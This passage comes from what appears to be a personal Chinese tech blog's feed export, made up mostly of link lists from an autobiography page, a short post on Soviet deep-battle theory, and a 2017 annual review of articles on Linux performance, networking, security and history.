<h5 id="网络设备安全认证服务可靠性增强方法、系统（第一发明人）"><a href="#网络设备安全认证服务可靠性增强方法、系统（第一发明人）" class="headerlink" title="网络设备安全认证服务可靠性增强方法、系统（第一发明人）"></a><a href="#">网络设备安全认证服务可靠性增强方法、系统（第一发明人）</a></h5><h5 id="终端接入办公网络安全管控方法及认证服务器（第一发明人）"><a href="#终端接入办公网络安全管控方法及认证服务器（第一发明人）" class="headerlink" title="终端接入办公网络安全管控方法及认证服务器（第一发明人）"></a><a href="#">终端接入办公网络安全管控方法及认证服务器（第一发明人）</a></h5><h5 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h5><ul>
<li><a href="#">201911233006.2 机房市电停电监测方法及装置</a></li>
</ul>
<h2 id="三、Engineering"><a href="#三、Engineering" class="headerlink" title="三、Engineering"></a>三、Engineering</h2><h4 id="Introducing"><a href="#Introducing" class="headerlink" title="Introducing"></a>Introducing</h4><p>工程学是指将知识（通常是科学，数学和经验）应用于结构，机器，材料，设备，系统，过程和组织的创新，设计，构造，操作和维护。</p>
<blockquote>
<p>The activity of applying scientific knowledge to the design, building, and control of machines,roads, bridges, electrical equipment,etc. ——《牛津英语词典》</p>
<p>Engineering is the application of knowledge, typically in the form of science, mathematics, and empirical evidence, to the innovation, design, construction, operation and maintenance of structures, machines, materials, devices, systems, processes, and organizations. —— Wiki</p>
</blockquote>
<h4 id="科学精神"><a href="#科学精神" class="headerlink" title="科学精神"></a>科学精神</h4><ul>
<li><a href="https://riboseyim.github.io/2018/12/31/Science-Feynman/" target="_blank" rel="noopener">费曼：发现的乐趣</a></li>
<li><a href="https://riboseyim.com/2019/02/04/Engineering-Ethics/">国之重器，在人不在宝 | 挑战者号航天飞机事故调查</a></li>
</ul>
<h4 id="决策理论"><a href="#决策理论" class="headerlink" title="决策理论"></a>决策理论</h4><ul>
<li><a href="#">博弈论：托马斯·谢林系列</a></li>
<li><a href="http://riboseyim.github.io/2019/02/10/Psychology-Biases/" target="_blank" rel="noopener">情绪的动物：认知、偏见与决策</a></li>
<li><a href="https://riboseyim.github.io/2018/12/31/Intelligence-Decision/" target="_blank" rel="noopener">如何作出正确决策</a></li>
<li><a href="https://riboseyim.github.io/2019/03/17/International-Relations-Kaplan/" target="_blank" rel="noopener">行走的思想家:罗伯特·D.卡普兰</a></li>
<li><a href="https://riboseyim.com/2019/02/04/Engineering-Ethics/">国之重器，在人不在宝 | 挑战者号航天飞机事故调查</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/" target="_blank" rel="noopener">红楼故事：康熙的秘密情报系统</a></li>
</ul>
<h4 id="控制理论"><a href="#控制理论" class="headerlink" title="控制理论"></a>控制理论</h4><ul>
<li><a href="#">控制论</a></li>
<li><a href="#">复杂适应系统</a></li>
<li><a href="#">复杂性理论</a></li>
<li><a href="#">成熟度理论</a></li>
<li><a href="#">可靠性理论</a></li>
</ul>
<h4 id="组织理论"><a href="#组织理论" class="headerlink" title="组织理论"></a>组织理论</h4><ul>
<li><a href="https://riboseyim.github.io/2020/02/04/Commander-Art-Of-War/" target="_blank" rel="noopener">讲武堂|《孙子兵法》研究</a></li>
<li><a href="https://riboseyim.github.io/2020/02/08/Commander-Art-Of-War-SuYu/" target="_blank" rel="noopener">讲武堂|粟裕的军事谋略与指挥艺术</a></li>
</ul>
<h4 id="项目管理"><a href="#项目管理" class="headerlink" title="项目管理"></a>项目管理</h4><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/" target="_blank" rel="noopener">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/" target="_blank" rel="noopener">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/" target="_blank" rel="noopener">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.com/2019/05/29/Project-Tech-NetworkPlanning/">PM指南:网络计划技术|工具与技术</a></li>
<li><a href="https://riboseyim.com/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h4 id="数学"><a href="#数学" class="headerlink" title="数学"></a><a href="https://riboseyim.github.io/2017/06/14/Mathmetics" target="_blank" rel="noopener">数学</a></h4><ul>
<li>Preview<a href="https://riboseyim.github.io/2019/01/09/Data-Science" target="_blank" rel="noopener">数据科学工具箱</a></li>
<li>Preview<a href="https://riboseyim.github.io/2018/12/23/Visualization-DataStruct/" target="_blank" rel="noopener">数据可视化（九）：探索数据结构之美</a></li>
<li>Priview<a href="https://riboseyim.github.io/2018/02/02/Mathmetics-Tools/" target="_blank" rel="noopener">数学工具指南</a></li>
<li>Preview<a href="https://riboseyim.github.io/2018/12/31/Mathmetics-Algorithm/" target="_blank" rel="noopener">数学与算法</a></li>
<li><a href="#">《应用预测建模》</a></li>
</ul>
<h4 id="大众传播"><a href="#大众传播" class="headerlink" title="大众传播"></a>大众传播</h4><ul>
<li><a href="#">《写作这门手艺》</a></li>
</ul>
<h4 id="建筑工程"><a href="#建筑工程" class="headerlink" title="建筑工程"></a>建筑工程</h4><ul>
<li><a href="http://riboseyim.github.io/2018/12/31/Engineering-Architecture/" target="_blank" rel="noopener">《图像中国建筑史》</a></li>
<li><a href="http://riboseyim.github.io/2018/12/31/Engineering-Architecture/" target="_blank" rel="noopener">《建筑的复杂性与矛盾性》</a></li>
</ul>
<h4 id="通信工程"><a href="#通信工程" class="headerlink" title="通信工程"></a>通信工程</h4><ul>
<li>路由可视化</li>
<li>流量可视化</li>
<li>Preview<a href="https://riboseyim.github.io/2018/11/21/Protocol-Route/" target="_blank" rel="noopener">网络专题 | 路由协议概览</a></li>
<li>Preview<a href="https://riboseyim.github.io/2019/03/05/Linux-Works-Route/" target="_blank" rel="noopener">操作系统原理:How Linux Works(五):Route</a></li>
<li>IP地址管理：IPv4地址规划与管理、IPv6地址规划与管理</li>
<li>网络安全</li>
</ul>
<h4 id="软件工程"><a href="#软件工程" class="headerlink" title="软件工程"></a>软件工程</h4><ul>
<li>软件调试</li>
<li>动态追踪技术 | strace 应用</li>
<li>Preview<a href="https://riboseyim.github.io/2018/11/30/DTrace-SystemTap/" target="_blank" rel="noopener">动态追踪技术 | SystemTap</a></li>
<li>Preview<a href="https://riboseyim.github.io/2018/12/10/DevOps-Build/" target="_blank" rel="noopener">DevOps 漫谈:全生命周期构建管理</a></li>
</ul>
<h2 id="四、Economist"><a href="#四、Economist" class="headerlink" title="四、Economist"></a>四、Economist</h2><h4 id="Organization"><a href="#Organization" class="headerlink" title="Organization"></a>Organization</h4><ul>
<li><a href="https://riboseyim.com/2016/04/26/OpenSource/">《大教堂与集市》</a></li>
<li>《组织理论与设计》</li>
<li>《组织行为学》</li>
</ul>
<h4 id="Culture"><a href="#Culture" class="headerlink" title="Culture"></a>Culture</h4><h4 id="History"><a href="#History" class="headerlink" title="History"></a>History</h4><ul>
<li><a href="https://riboseyim.github.io/2018/12/31/History-Rome/" target="_blank" rel="noopener">专题：罗马史</a></li>
<li><a href="https://riboseyim.github.io/2018/12/31/History-Empire/" target="_blank" rel="noopener">读书笔记《帝国的铸就》</a></li>
<li><a href="https://riboseyim.github.io/2019/03/17/International-Relations-Kaplan/" target="_blank" rel="noopener">行走的思想家:罗伯特·D.卡普兰</a></li>
</ul>
<h2 id="活动"><a href="#活动" class="headerlink" title="活动"></a>活动</h2><h4 id="演出活动"><a href="#演出活动" class="headerlink" title="演出活动"></a>演出活动</h4><ul>
<li>Preview<a href="https://riboseyim.github.io/2019/01/20/Artistic-Antoniano/" target="_blank" rel="noopener">安东尼亚诺合唱团</a></li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>类别</th>
<th>剧目</th>
<th>演出</th>
<th>地点</th>
<th>时间</th>
</tr>
</thead>
<tbody>
<tr>
<td>合唱</td>
<td>主题：安东尼亚诺小合唱团</td>
<td>B站、Youtube</td>
<td></td>
<td>201801</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
<h4 id="户外活动"><a href="#户外活动" class="headerlink" title="户外活动"></a>户外活动</h4><div class="table-container">
<table>
<thead>
<tr>
<th>类别</th>
<th>地点</th>
<th>时间</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>历史遗址</td>
<td>南京·明城墙</td>
<td>201801</td>
<td></td>
</tr>
<tr>
<td>历史遗址</td>
<td><a href="http://www.jimingsi.net" target="_blank" rel="noopener">南京·鸡鸣寺</a></td>
<td>201801</td>
<td>比丘尼佛学院</td>
</tr>
<tr>
<td>博物馆</td>
<td>南京博物院</td>
<td>201801</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
<h4 id="2018-年遗留课题"><a href="#2018-年遗留课题" class="headerlink" title="2018 年遗留课题"></a>2018 年遗留课题</h4><ul>
<li><a href="https://riboseyim.github.io/2018/04/27/Language-Go-lang-Web/" target="_blank" rel="noopener">玩转编程语言:基于Golang开发Web应用</a></li>
<li>Priview<a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/" target="_blank" rel="noopener">Machine Learning:机器学习技术与知识产权法</a></li>
<li>Preview<a href="http://riboseyim.github.com/2018/01/07/History-Tang/" target="_blank" rel="noopener">关于唐史</a></li>
<li>Preview<a href="https://riboseyim.github.io/2018/01/17/History-Tang-DiRenjie/" target="_blank" rel="noopener">唐史|狄仁杰</a></li>
<li>Preview<a href="http://riboseyim.github.com/2018/01/07/Addiction-Decision-Behavior/" target="_blank" rel="noopener">《嗑药简史：行为成瘾》</a></li>
<li>Preview<a href="https://riboseyim.github.io/2018/03/30/Lincoln-Chicago-Orchestra/" target="_blank" rel="noopener">关于交响乐团</a></li>
<li><a href="https://riboseyim.github.io/2018/03/21/Machine-Learning-WordBook/" target="_blank" rel="noopener">Machine Learning:WordBook</a></li>
<li><a href="https://riboseyim.github.io/2018/02/27/Machine-Learning-TrainModel/" target="_blank" rel="noopener">Machine Learning:Training Models</a></li>
</ul>
<h4 id="2017-年遗留课题"><a href="#2017-年遗留课题" class="headerlink" title="2017 年遗留课题"></a>2017 年遗留课题</h4><ul>
<li><p>[ ] FlameGraph<br>目标定位：熟练使用<br>立项时间：2015年11月<br>当前进度：——-</p>
</li>
<li><p>[ ] 源码解读系列文集<br>目标定位：面向输出的学习能力<br>立项时间：2016年2月<br>当前进度：——-</p>
</li>
<li><p>[ ] <a href="https://riboseyim.github.io/2017/05/12/Protocol-TCP/" target="_blank" rel="noopener">《TCP／IP详解》【英】</a><br>  目标定位：通读<br>  立项时间：2016年11月<br>  当前进度：略读</p>
</li>
<li><p>[ ] 《Learning Spark》【英】<br>  目标定位：通读、熟练掌握<br>  立项时间：2016年11月<br>  当前进度：————-</p>
</li>
<li><p>[ ] 《林肯传（英文版）》 （50%）</p>
</li>
<li><p>[ ] 《通往奴役之路（英文版）》（0%）</p>
</li>
<li><p>[ ] 《Team of Rivals，the Political Genius of Abraham Lincoln》<br>目标定位：通读<br>立项时间：2016年中<br>当前进度：——-</p>
</li>
<li><p>[ ] 《The Water Kingdom: A Secret History of China》<br>目标定位：通读<br>立项时间：2016年12月<br>当前进度：——-</p>
</li>
<li><p>[ ] 《罗马帝国衰亡史》<br>目标定位：通读<br>立项时间：2014年<br>当前进度：——-</p>
</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li>蒋百里全集</li>
</ul>
]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title>现代战役理论研究</title>
    <url>/2020/02/04/Commander-Art-Of-War-Battle-Theory/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>苏联/俄罗斯 大纵深战役理论</li>
</ul>
<a id="more"></a>
<h3 id="苏联-俄罗斯-大纵深战役理论"><a href="#苏联-俄罗斯-大纵深战役理论" class="headerlink" title="苏联/俄罗斯 大纵深战役理论"></a>苏联/俄罗斯 大纵深战役理论</h3><h4 id="主要突击方向"><a href="#主要突击方向" class="headerlink" title="主要突击方向"></a>主要突击方向</h4><p>选择主要突击方向时，应该考虑到不同的战役方向对敌人分别具有怎样的意义。在选定的主要突击方向上取得的战果，应能导致战役范围的胜利，这就是要求正确选择突击方向的实质。</p>
<p>总而言之，主要突击方向应该直通敌人后方，以限制其机动能力(剥夺其变更部署和调动兵力的自由)，通过把其注意力吸引到数个地域而降低其快速性，使突击集团处在有利于向敌正面各相邻地段翼侧和后方发展突击的态势。显然，应以辅助集团的行动策应主要方向突击集团的行动，以牵制敌人兵力和转移其注意力。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="军事史"><a href="#军事史" class="headerlink" title="军事史"></a>军事史</h4><ul>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-CN/" target="_blank" rel="noopener">中国军事史 | Military History of China</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">美国军事史 | Military History of United States</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/" target="_blank" rel="noopener">太平天国史</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">私人历史文献 | 弗吉尼亚笔记</a></li>
<li><a href="https://riboseyim.github.io/2017/10/22/History-Qing-ZhangJiXing/" target="_blank" rel="noopener">私人历史文献 | 时晴斋主人自叙年谱</a></li>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/" target="_blank" rel="noopener">黄仁宇:《明代的漕运》</a></li>
</ul>
<h4 id="体能训练"><a href="#体能训练" class="headerlink" title="体能训练"></a>体能训练</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">Physical Training | 美军体能训练观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand" target="_blank" rel="noopener">Physical Training | 军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.com/2016/04/26/PHT-Running//">Physical Training | 训练项目：跑步</a></li>
<li><a href="https://riboseyim.com/2019/05/19/PHT-Skipping/">Physical Training | 训练项目：跳绳</a></li>
<li><a href="http://www.jianshu.com/p/6a2fea20b57b" target="_blank" rel="noopener">Physical Training | 跑步路线推荐</a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-RunningApp/">Physical Training | 跑步应用评测</a></li>
</ul>
<h4 id="讲武堂"><a href="#讲武堂" class="headerlink" title="讲武堂"></a>讲武堂</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-Art-Of-War-Chinese/" target="_blank" rel="noopener">讲武堂|中国传统兵法摘要</a></li>
<li><a href="https://riboseyim.github.io/2020/02/04/Commander-Art-Of-War/" target="_blank" rel="noopener">讲武堂|《孙子兵法》研究</a></li>
<li><a href="https://riboseyim.github.io/2020/02/08/Commander-Art-Of-War-SuYu/" target="_blank" rel="noopener">讲武堂|粟裕的军事谋略与指挥艺术</a></li>
<li><a href="https://riboseyim.github.io/2017/08/15/Commander-Sergeant/" target="_blank" rel="noopener">外军研究|美军士官制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">外军研究|军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand/" target="_blank" rel="noopener">外军研究|军队体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/Medal/" target="_blank" rel="noopener">外军研究|美军授勋和嘉奖制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Medal-HK/" target="_blank" rel="noopener">太公分猪肉—香港特区授勋和嘉奖制度批判</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://ctext.org/wiki.pl?if=gb&amp;res=3&amp;remap=gb" target="_blank" rel="noopener">《纪效新书》| 明·戚继光 | 四库全书本</a></li>
<li><a href="http://www.shuku.net:8082/novels/zhuanji/syzzhylu/syzzhylu.html" target="_blank" rel="noopener">《粟裕战争回忆录》 | 粟裕 </a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/image_824254815542_3.png" alt></p>
]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Manager</tag>
        <tag>讲武堂</tag>
        <tag>Commander</tag>
        <tag>Intelligence</tag>
      </tags>
  </entry>
  <entry>
    <title>我的2017年度盘点</title>
    <url>/2017/04/10/Check2017/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>一、Core Topics</li>
<li>二、年度成果</li>
<li>三、过程改进 &amp; 方法论</li>
<li>四、Information Technology</li>
<li>五、Culture &amp; History</li>
<li>六、生活艺术</li>
<li>七、品牌运营</li>
</ul>
<span id="more"></span>
<p>This article is part of an <strong>Autobiography</strong> tutorial series. Make sure to check out my other articles as well:</p>
<ul>
<li><a href="https://riboseyim.github.io/2018/12/31/Check2019/">我的 2019 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2018/01/01/Check2018/">我的 2018 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/10/Check2017/">我的 2017 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/01/01/Check2016/">我的 2016 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/28/Check2012/">我的 2012 阅读书单</a></li>
</ul>
<h2 id="一、Core-Topics"><a href="#一、Core-Topics" class="headerlink" title="一、Core Topics"></a>一、Core Topics</h2><ul>
<li>Learning based on full English.</li>
<li>Operating System Kernel &amp; Dynamic tracking &amp; Go Programming Language.</li>
<li>Lincoln Foundation &amp; Absolutism Research.</li>
<li><a href="https://riboseyim.github.io/2016/12/19/Cheeck2017-Plan/">2017 年初计划复核</a></li>
</ul>
<h2 id="二、年度成果"><a href="#二、年度成果" class="headerlink" title="二、年度成果"></a>二、年度成果</h2><h4 id="2-1-电子书《Linux-Perf-Master》"><a href="#2-1-电子书《Linux-Perf-Master》" class="headerlink" title="2.1 电子书《Linux Perf Master》"></a>2.1 <a href="https://riboseyim.github.io/2017/02/09/eBook/">电子书《Linux Perf Master》</a></h4><ul>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>时间点</th>
<th>订阅用户数</th>
<th>Downloads</th>
<th>Unique visitors</th>
<th>Page Views</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>201701</td>
<td>——-</td>
<td>——-</td>
<td>——-</td>
<td>——-</td>
<td>GitBook Edition 0.1</td>
</tr>
<tr>
<td>20170630</td>
<td>135</td>
<td>4,206</td>
<td>4,936</td>
<td>——-</td>
<td>GitBook Edition 0.2</td>
</tr>
<tr>
<td>20171230</td>
<td>187</td>
<td>4,821</td>
<td>7,708</td>
<td>29,052</td>
<td>GitBook Edition 0.3</td>
</tr>
</tbody>
</table>
</div>
<h4 id="2-2-专利实务（发明）"><a href="#2-2-专利实务（发明）" class="headerlink" title="2.2 专利实务（发明）"></a>2.2 专利实务（发明）</h4><ul>
<li>申请号：201711294715.2</li>
</ul>
<h2 id="三、过程改进-amp-方法论"><a href="#三、过程改进-amp-方法论" class="headerlink" title="三、过程改进 &amp; 方法论"></a>三、过程改进 &amp; 方法论</h2><ul>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban看板管理实践精要</a></li>
<li><a href="https://riboseyim.github.io/2017/06/03/Writing-WriterToolChain/">我的写作工具链（持续更新,v3）</a></li>
<li><a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/">嗑药简史：关于瘾品，成瘾机制及其历史</a></li>
</ul>
<h2 id="四、Information-Technology"><a href="#四、Information-Technology" class="headerlink" title="四、Information Technology"></a>四、Information Technology</h2><ul>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术（四）：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术（三）：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.github.io/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.github.io/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.github.io/2017/05/12/Visualization-GIS/">数据可视化（四）开源 GIS 技术简史</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图 | 开源中国首页推荐·每日一博</a></li>
<li><a href="https://riboseyim.github.io/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.github.io/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）: OpenFlow </a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/10/29/CyberSecurity-WiFi/">Cyber-Security: 警惕 WiFi 安全漏洞</a></li>
<li><a href="https://riboseyim.github.io/2017/08/31/CyberSecurity-Headers/">Cyber-Security: WEB应用安全、攻击、防护和检测</a></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security: 香港警务处网络安全与科技罪案调查科</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/">远程通信协议：从 CORBA 到 gRPC</a></li>
<li><a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/">基于 Kafka 构建事件溯源型微服务</a></li>
<li><a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">基于 Go 语言快速构建一个RESTful API服务</a></li>
<li><a href="https://riboseyim.github.io/2017/05/24/Log/">关于程序日志Logger(Go语言描述)</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（二）：User Space &amp; RAM</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Works-Memory/">操作系统原理 | How Linux Works（三）：Memory</a></li>
<li><a href="https://riboseyim.github.io/2017/04/26/Linux-Commands/">Linux 常用命令一百条</a></li>
<li><a href="https://riboseyim.github.io/2017/10/24/Linux-Perf-Picture/">Linux 性能诊断：荐书|《图解性能优化》</a></li>
<li><a href="https://riboseyim.github.io/2017/10/24/Linux-Perf-Wan/">Linux 性能诊断：Web应用性能优化</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a> 修订 2.0</li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单(Netflix版)</a> 修订 2.0</li>
<li><a href="https://riboseyim.github.io/2017/12/21/Language-Auto-Generator/">玩转编程语言:构建自定义代码生成器</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/OpenSource-Operational/ß">Linux.com:引入开源软件的六大运营挑战</a></li>
<li><a href="https://riboseyim.github.io/2017/07/05/Law-Of-Engineering/">软件工程实践中的十大法则</a></li>
<li><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/">Stack Overflow：云计算平台的趋势分析</a></li>
<li><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/">Stack Overflow：2017年最赚钱的编程语言</a></li>
<li><a href="https://riboseyim.github.io/2017/08/18/SDN-ONOS/">资讯| 三星主办 ONOS Build 2017</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-Natural-Language/">机器学习|自然语言处理技术简报</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-Natural-Language/">经济学人：计算机如何学习人类语言？</a></li>
</ul>
<h2 id="五、Culture-amp-History"><a href="#五、Culture-amp-History" class="headerlink" title="五、Culture &amp; History"></a>五、Culture &amp; History</h2><ul>
<li><a href="https://riboseyim.github.io/2017/12/09/Policy-Female/">真假女权主义：从江青到咪蒙</a></li>
<li><a href="https://riboseyim.github.io/2017/10/18/Artistic-Poetry/">风月集|诗三百，思无邪</a></li>
<li><a href="https://riboseyim.github.io/2017/08/28/Redology/">读书笔记|红学 </a></li>
<li><a href="https://riboseyim.github.io/2017/10/04/Redology-DunMing/">红楼故事：佩刀沽酒作长歌</a></li>
<li><a href="https://riboseyim.github.io/2016/04/24/LinusTorvalds/">读书笔记|Linux之父：Just for Fun！</a></li>
<li><a href="https://riboseyim.github.io/2017/12/09/Policy-Female/">政府行为模型及预测：女权主义与政治运动</a></li>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/">读书笔记|黄仁宇《明代的漕运》</a></li>
<li><a href="https://riboseyim.github.io/2017/10/22/History-Qing-ZhangJiXing/">读书笔记|张集馨《时晴斋主人自叙年谱》</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/">读书笔记|宋景迁《太平天国》</a></li>
<li><a href="https://riboseyim.github.io/2017/04/20/MrGuZhun/">读书笔记|顾准《顾准日记》</a></li>
<li><a href="https://riboseyim.github.io/2017/07/02/Manager/">读书笔记|彼得·德鲁克：管理是一种自由</a></li>
<li><a href="https://riboseyim.github.io/2017/04/28/Check2012/">不忘初心|我的2012年阅读书单</a></li>
<li><a href="https://riboseyim.github.io/2017/05/13/Lincoln-Spielberg/">艺术评论|斯皮尔伯格的林肯情怀</a></li>
<li><a href="https://riboseyim.github.io/2017/04/13/Artistic-Les-Miserables/">艺术评论|经济学人：解读世纪小说《悲惨世界》</a></li>
<li><a href="https://riboseyim.github.io/2017/03/16/Policy-Publish-Children/">Financial Times：中国将加强进口儿童文学作品管制</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/Medal/">外军研究|美军授勋及嘉奖制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Medal-HK/">太公分猪肉——香港特区授勋和嘉奖制度批判</a></li>
</ul>
<h2 id="六、生活"><a href="#六、生活" class="headerlink" title="六、生活"></a>六、生活</h2><ul>
<li><a href="https://riboseyim.github.io/2017/07/02/BirdWatching/">Birdwatching|广州南沙湿地公园</a></li>
<li><a href="https://riboseyim.github.io/2017/07/02/BirdWatching/">Birdwatching|广州海珠湿地公园</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/Artistic-Garden/">园林|南京瞻园</a></li>
<li>Skill: Cooking</li>
<li>Skill: Clock Repair</li>
<li>骑行：1000 公里</li>
</ul>
<h2 id="七、品牌运营"><a href="#七、品牌运营" class="headerlink" title="七、品牌运营"></a>七、品牌运营</h2><blockquote>
<p>天之将明，其黑尤烈；飓风过岗，伏草惟存。</p>
</blockquote>
<ul>
<li>1、<a href="https://riboseyim.github.io">RiboseYim’s Blog(riboseyim.github.io)</a></li>
<li>2、<a href="https://twitter.com/RiboseYim">RiboseYim’s Twitter</a></li>
<li>3、<a href="https://t.me/riboseyim">RiboseYim’s Telegram</a></li>
</ul>
<hr>

<h2 id="2017年中盘点"><a href="#2017年中盘点" class="headerlink" title="2017年中盘点"></a>2017年中盘点</h2><h4 id="方法论"><a href="#方法论" class="headerlink" title="方法论"></a>方法论</h4><ul>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
</ul>
<h4 id="过程改进"><a href="#过程改进" class="headerlink" title="过程改进"></a>过程改进</h4><ul>
<li><a href="https://riboseyim.github.io/2017/06/03/Writing-WriterToolChain/">我的写作工具链（持续更新,v3）</a></li>
<li>add: OmniFocus</li>
<li>advanced: OmniGraffle 、 Atom 、 Ulysses</li>
